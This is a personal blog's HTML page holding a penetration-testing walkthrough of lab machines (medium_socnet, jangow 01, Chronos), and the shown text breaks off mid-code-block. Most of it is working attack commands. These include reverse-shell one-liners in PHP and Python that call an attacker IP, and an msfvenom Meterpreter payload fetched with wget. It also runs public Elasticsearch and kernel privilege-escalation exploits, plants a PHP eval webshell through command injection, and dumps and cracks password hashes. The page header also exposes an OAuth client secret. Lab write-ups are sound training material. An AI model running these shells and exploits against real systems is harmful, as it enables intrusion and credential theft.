<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="jerem1ah">
    
    <title>
        
            渗透靶机 |
        
        Jerem1ah&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
    
<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/css/regular.min.css">

    
<link rel="stylesheet" href="/fontawesome/css/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/css/brands.min.css">

    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","favicon":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","avatar":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":false,"preload":false},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":"Lejeremiah","github_admins":null,"repository":"gitalk","client_id":"a415960e8a19902e98bf","client_secret":"97151a67ce9c95ad3c333c402f4cee0f5f05020f"},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":false,"wordcount":false,"min2read":false},"img_align":"left","copyright_info":false},"version":"3.5.2"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
                </a>
            
            <a class="logo-title" href="/">
               Jerem1ah&#39;s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                LINKS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                ABOUT
                            </a>
                        </li>
                    
                    
                </ul>
            </div>
            <div class="mobile">
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">LINKS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">渗透靶机</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">jerem1ah</span>
                            
                                <span class="author-label">Lv4</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2023-08-17 14:41:07</span>
        <span class="mobile">2023-08-17 14:41</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2024-08-13 09:51:13</span>
    </span>
    
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/pentest/">pentest</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                <h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="0x00————————————"><a href="#0x00————————————" class="headerlink" title="0x00————————————"></a>0x00————————————</h1><h1 id="0x00———–靶机————–"><a href="#0x00———–靶机————–" class="headerlink" title="0x00———–靶机————–"></a>0x00———–靶机————–</h1><h1 id="0x00————————————-1"><a href="#0x00————————————-1" class="headerlink" title="0x00————————————"></a>0x00————————————</h1><h1 id="Good："><a href="#Good：" class="headerlink" title="Good："></a>Good：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 443 &gt;/tmp/f&#x27;);?&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,7779));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure>





<h1 id="靶机-medium-socnet"><a href="#靶机-medium-socnet" class="headerlink" title="靶机: medium_socnet"></a>靶机: medium_socnet</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/shadow-/p/16815020.html" >https://www.cnblogs.com/shadow-/p/16815020.html<i class="fas fa-external-link-alt"></i></a></p>
<p>python反弹shell：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.56.102&quot;</span>,<span class="number">7779</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>msf连接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.56.102 lport=7778 -f elf -o /var/www/html/mshell.elf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102:80/mshell.elf</span><br><span class="line">chmod 777 mshell.elf </span><br><span class="line">chmod +x mshell.elf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.56.102</span><br><span class="line">set lport 7778</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>内网扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; shell</span><br><span class="line">&gt; ip a</span><br><span class="line"></span><br><span class="line">run autoroute -s 172.17.0.0/16</span><br><span class="line">run autoroute -p</span><br><span class="line">background</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set VERSION 5</span><br><span class="line">set SRVHOST 192.168.56.102</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch proxychains.conf</span><br><span class="line">sudo cat /etc/proxychains4.conf &gt; ./proxychains.conf</span><br><span class="line">vim ./proxychains.conf   #socks5 192.168.56.102 1080</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -f ./proxychains.conf nmap -Pn -sT 172.17.0.0/24</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions -1</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; sessions -1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ip a</span><br><span class="line">[-] Unknown command: ip</span><br><span class="line">meterpreter &gt; arp -a</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">=========</span><br><span class="line"></span><br><span class="line">    IP address  MAC address        Interface</span><br><span class="line">    ----------  -----------        ---------</span><br><span class="line">    172.17.0.1  02:42:fb:53:61:32</span><br><span class="line">    172.17.0.3  02:42:ac:11:00:03</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -f ./proxychains.conf nmap -Pn -sT 172.17.0.1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[proxychains] Dynamic chain  ...  192.168.56.102:1080  ...  172.17.0.1:3324 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Dynamic chain  ...  192.168.56.102:1080  ...  172.17.0.1:1009 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Dynamic chain  ...  192.168.56.102:1080  ...  172.17.0.1:9595 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Dynamic chain  ...  192.168.56.102:1080  ...  172.17.0.1:9485 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Dynamic chain  ...  192.168.56.102:1080  ...  172.17.0.1:617 &lt;--socket error or timeout!</span><br><span class="line">Nmap scan report for 172.17.0.1 (172.17.0.1)</span><br><span class="line">Host is up (0.0040s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">5000/tcp open  upnp</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 4.80 seconds                                                                    </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -f ./proxychains.conf nmap -Pn -sT -sV 172.17.0.3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[proxychains] Dynamic chain  ...  192.168.56.102:1080  ...  172.17.0.3:9200 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Dynamic chain  ...  192.168.56.102:1080  ...  172.17.0.3:9200 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Dynamic chain  ...  192.168.56.102:1080  ...  172.17.0.3:9200  ...  OK</span><br><span class="line">Nmap scan report for 172.17.0.3 (172.17.0.3)</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">9200/tcp open  http    Elasticsearch REST API 1.4.2 (name: Tyrant; cluster: elasticsearch; Lucene 4.10.2)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 141.92 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Elasticse</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python2    # 安装 python2</span><br><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py &amp;&amp; python2 get-pip.py     # 安装 python2 的 pip2 如果有就跳过此步</span><br><span class="line">python2 -m pip install requests     # 安装 requests 包</span><br><span class="line">proxychains4 -f ./proxychains.conf python2 /usr/share/exploitdb/exploits/linux/remote/36337.py 172.17.0.3  # 利用 36337.py 脚本</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">cat passwords</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~$ cat passwords</span><br><span class="line">[proxychains] Dynamic chain  ...  192.168.56.102:1080  ...  172.17.0.3:9200  ...  OK</span><br><span class="line">Format: number,number,number,number,lowercase,lowercase,lowercase,lowercase</span><br><span class="line">Example: 1234abcd</span><br><span class="line">john:3f8184a7343664553fcb5337a3138814 </span><br><span class="line">test:861f194e9d6118f3d942a72be3e51749</span><br><span class="line">admin:670c3bbc209a18dde5446e5e6c1f1d5b</span><br><span class="line">root:b3d34352fc26117979deabdf1b9b6354</span><br><span class="line">jane:5c158b60ed97c723b673529b8a3cf72b</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://md5.cn/</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230709224623666.png" alt="image-20230709224623666"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">john:1337hack;</span><br><span class="line">test:1234test;</span><br><span class="line">admin:1111pass;</span><br><span class="line">root:1234pass;</span><br><span class="line">jane:1234jane</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 22 john@192.168.56.103</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Linux 3.13.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/37292.c</span><br><span class="line">cd /home/kali/Desktop/</span><br><span class="line">cat /usr/share/exploitdb/exploits/linux/local/37292.c &gt; ./37292.c</span><br><span class="line">vim ./37292.c</span><br><span class="line">gcc -o ./exp ./37292.c</span><br><span class="line">cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so ./ofs-lib.so</span><br><span class="line">python -m http.server 8081</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102:8081/exp &amp;&amp; wget http://192.168.56.102:8081/ofs-lib.so</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./exp &amp;&amp; chmod +x ./ofs-lib.so &amp;&amp; cp ./ofs-lib.so /tmp/ofs-lib.so</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd --version</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">john@socnet:~$ ldd --version</span><br><span class="line">ldd (Ubuntu EGLIBC 2.19-0ubuntu6) 2.19</span><br><span class="line">Copyright (C) 2014 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john@socnet:~$ uname -a</span><br><span class="line">Linux socnet 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230710002524422.png" alt="image-20230710002524422"></p>
<h1 id="靶机-jangow-01"><a href="#靶机-jangow-01" class="headerlink" title="靶机: jangow 01"></a>靶机: jangow 01</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">sudo su</span><br><span class="line">arp-scan -l -I eth0</span><br><span class="line">nmap 192.168.56.118</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.118/site/busque.php?buscar=id</span><br><span class="line">http://192.168.56.118/site/busque.php?buscar=echo &#x27;&lt;?php eval($_POST[&quot;pass&quot;]);&#x27; &gt; 666.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.118/site/busque.php?buscar=echo &#x27;&lt;?php eval($_POST[1]);&#x27; &gt; shell.php</span><br></pre></td></tr></table></figure>



<p>php反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 443 &gt;/tmp/f&#x27;);?&gt; </span><br></pre></td></tr></table></figure>



<p>python 交互式shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a #系统版本</span><br><span class="line">lsb_release -a #系统发行版本</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 45010.c</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --static 45010.c -o exp2</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230710104943575.png" alt="image-20230710104943575"></p>
<h1 id="靶机-Chronos"><a href="#靶机-Chronos" class="headerlink" title="靶机: Chronos"></a>靶机: Chronos</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/shadow-/p/16828146.html" >https://www.cnblogs.com/shadow-/p/16828146.html<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">arp-scan -l -I eth0</span><br><span class="line">namp 192.168.56.104</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap 192.168.56.104    </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 00:33 EDT</span><br><span class="line">Nmap scan report for 192.168.56.104 (192.168.56.104)</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8000/tcp open  http-alt</span><br><span class="line">MAC Address: 08:00:27:F8:EE:F0 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap -sV 192.168.56.104</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 00:36 EDT</span><br><span class="line">Nmap scan report for 192.168.56.104 (192.168.56.104)</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">8000/tcp open  http    Node.js Express framework</span><br><span class="line">MAC Address: 08:00:27:F8:EE:F0 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.89 seconds</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.104:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Chronos</span><br></pre></td></tr></table></figure>



<p>命令注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; ls #5Jdixo4</span><br><span class="line">&amp;&amp;ls  #yZSGA</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.104:8000/date?format=yZSGA </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Chronos</span><br></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; ls -lh /bin</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F2SaSe3T3SZy3G4RcHK</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.104:8000/date?format=F2SaSe3T3SZy3G4RcHK</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 